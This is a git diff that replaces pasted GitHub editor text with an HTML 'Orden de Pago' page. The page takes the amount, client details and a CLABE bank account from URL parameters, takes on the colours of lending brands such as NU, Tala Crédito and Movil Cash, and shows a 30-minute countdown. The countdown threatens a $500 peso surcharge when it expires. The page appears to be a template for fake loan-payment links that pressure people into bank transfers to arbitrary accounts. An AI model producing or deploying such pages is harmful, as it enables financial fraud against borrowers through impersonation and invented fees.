@@ -1,71 +1,3 @@
-Skip to content
-oscarmontenegro20002-hub
-consulta-multasapp
-Repository navigation
-Code
-Issues
-Pull requests
-Actions
-Projects
-Wiki
-Security
-Insights
-Settings
-consulta-multasapp
-/
-detalle.html
-in
-main
-
-Edit
-
-Preview
-Indent mode
-
-Spaces
-Indent size
-
-4
-Line wrap mode
-
-No wrap
-Editing detalle.html file contents
-  1
-  2
-  3
-  4
-  5
-  6
-  7
-  8
-  9
- 10
- 11
- 12
- 13
- 14
- 15
- 16
- 17
- 18
- 19
- 20
- 21
- 22
- 23
- 24
- 25
- 26
- 27
- 28
- 29
- 30
- 31
- 32
- 33
- 34
- 35
- 36
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -102,5 +34,119 @@ Editing detalle.html file contents
                 <img id="img-final" src="">
             </div>
             <p style="font-size: 10px; font-weight: 800; letter-spacing: 1.5px; margin: 0; text-transform: uppercase;">Orden de Pago</p>
-Use Control + Shift + m to toggle the tab key moving focus. Alternatively, use esc then tab to move to the next interactive element on the page.
- 
+            <h1 id="txt-prod" style="font-size: 24px; font-weight: 900; margin: 5px 0 0 0; text-transform: uppercase;">Cargando...</h1>
+        </div>
+
+        <div style="padding: 25px;">
+            <div style="background-color: #f9fafb; border-radius: 35px; padding: 25px 15px; text-align: center; border: 1px solid #f1f5f9; margin-bottom: 20px;">
+                <p style="font-size: 9px; font-weight: 800; color: #9ca3af; margin: 0; text-transform: uppercase;">Monto Total a Pagar</p>
+                <h2 id="txt-monto" style="font-size: 48px; font-weight: 900; color: #0d9488; margin: 5px 0 0 0;">$0.00</h2>
+            </div>
+
+            <div style="margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f5f9; padding: 10px 0;">
+                    <span style="font-size: 10px; font-weight: 800; color: #9ca3af; text-transform: uppercase;">Nombre del Cliente</span>
+                    <span id="txt-nom" style="font-size: 13px; font-weight: 900; color: #1e293b; text-transform: uppercase;">-</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f5f9; padding: 10px 0;">
+                    <span style="font-size: 10px; font-weight: 800; color: #9ca3af; text-transform: uppercase;">Número de Teléfono</span>
+                    <span id="txt-tel" style="font-size: 13px; font-weight: 900; color: #1e293b;">-</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f5f9; padding: 10px 0;">
+                    <span style="font-size: 10px; font-weight: 800; color: #9ca3af; text-transform: uppercase;">Fecha de Vencimiento</span>
+                    <span id="txt-fec" style="font-size: 13px; font-weight: 900; color: #1e293b;">-</span>
+                </div>
+            </div>
+
+            <div style="background-color: #fff1f1; border: 1px solid #fee2e2; border-radius: 15px; padding: 15px; margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span id="timer-label" style="font-size: 9px; font-weight: 800; color: #ef4444; text-transform: uppercase;">La liga expira en:</span>
+                    <span id="timer" style="font-size: 22px; font-weight: 900; color: #ef4444;">29:51</span>
+                </div>
+                <p id="timer-msg" style="color: #ef4444; font-size: 9px; line-height: 1.3; font-weight: 600; margin: 8px 0 0 0;">
+                    * Al llegar a 0, se cobrarán <span style="font-weight: 900;">$500.00 pesos adicionales</span> por concepto de vencimiento de liga de pago.
+                </p>
+            </div>
+
+            <div style="background-color: #f0f7ff; border: 1px solid #e0f2fe; border-radius: 30px; padding: 20px; text-align: center;">
+                <p id="txt-banco-label" style="font-size: 9px; font-weight: 800; color: #3b82f6; margin: 0; text-transform: uppercase;">TRANSFERENCIA (SPEI)</p>
+                <div style="display: flex; align-items: center; justify-content: center; gap: 6px; margin: 5px 0;">
+                    <span id="txt-clabe" style="font-size: 22px; font-weight: 900; color: #2563eb;">-</span>
+                </div>
+            </div>
+
+            <button onclick="copyLink()" style="width: 100%; background-color: #1e293b; color: white; padding: 18px; border-radius: 20px; font-weight: 800; font-size: 13px; border: none; margin-top: 20px; text-transform: uppercase;">
+                Copiar Link de Pago
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        document.getElementById('img-final').src = urlParams.get('lg') || "";
+        const nombreProd = urlParams.get('pr') || "PRODUCTO";
+        document.getElementById('txt-prod').innerText = nombreProd;
+        document.getElementById('txt-monto').innerText = "$" + (urlParams.get('m') || "0.00");
+        document.getElementById('txt-nom').innerText = (urlParams.get('n') || "Cliente").toUpperCase();
+        document.getElementById('txt-tel').innerText = urlParams.get('t') || "0000000000";
+        document.getElementById('txt-fec').innerText = urlParams.get('f') || "-";
+        document.getElementById('txt-clabe').innerText = urlParams.get('cl') || "-";
+        document.getElementById('txt-banco-label').innerText = "TRANSFERENCIA " + (urlParams.get('b') || "MERCADO PAGO") + " (SPEI)";
+
+        // LOGICA DE COLORES
+        if(nombreProd.includes("NU")) {
+            document.getElementById('header-color').style.backgroundColor = "#820ad1";
+            document.getElementById('txt-monto').style.color = "#820ad1";
+        }
+        if(nombreProd.includes("rápidos")) {
+            document.getElementById('header-color').style.backgroundColor = "#10b981";
+            document.getElementById('txt-monto').style.color = "#10b981";
+        }
+        if(nombreProd.includes("Dida")) {
+            document.getElementById('header-color').style.backgroundColor = "#0057ff";
+            document.getElementById('txt-monto').style.color = "#0057ff";
+        }
+        if(nombreProd.includes("Worldmoxpro")) {
+            document.getElementById('header-color').style.backgroundColor = "#1e293b";
+            document.getElementById('txt-monto').style.color = "#1e293b";
+        }
+        if(nombreProd.includes("Tala Crédito")) {
+            document.getElementById('header-color').style.backgroundColor = "#06b6d4";
+            document.getElementById('txt-monto').style.color = "#06b6d4";
+        }
+        if(nombreProd.includes("Movil Cash")) {
+            document.getElementById('header-color').style.backgroundColor = "#22c55e";
+            document.getElementById('txt-monto').style.color = "#22c55e";
+        }
+        if(nombreProd.includes("Préstamos de Dinero")) {
+            document.getElementById('header-color').style.backgroundColor = "#1e40af";
+            document.getElementById('txt-monto').style.color = "#1e40af";
+        }
+        if(nombreProd.toLowerCase() === "préstamos") {
+            document.getElementById('header-color').style.backgroundColor = "#a3e635";
+            document.getElementById('txt-monto').style.color = "#65a30d";
+        }
+
+        const start = parseInt(urlParams.get('s')) || Date.now();
+        function updateTimer() {
+            const diff = (30 * 60 * 1000) - (Date.now() - start);
+            if (diff <= 0) { 
+                document.getElementById('timer').innerText = "00:00"; 
+                document.getElementById('timer-label').innerText = "LIGA EXPIRADA:";
+                document.getElementById('timer-msg').innerHTML = "<span style='font-weight: 900;'>SE HAN APLICADO $500.00 PESOS ADICIONALES</span> POR CONCEPTO DE VENCIMIENTO DE LIGA DE PAGO.";
+                return; 
+            }
+            const m = Math.floor(diff / 60000);
+            const s = Math.floor((diff % 60000) / 1000);
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' + s : s}`;
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        function copyLink() {
+            navigator.clipboard.writeText(window.location.href);
+            alert("Enlace copiado al portapapeles");
+        }
+    </script>
+</body>
+</html>
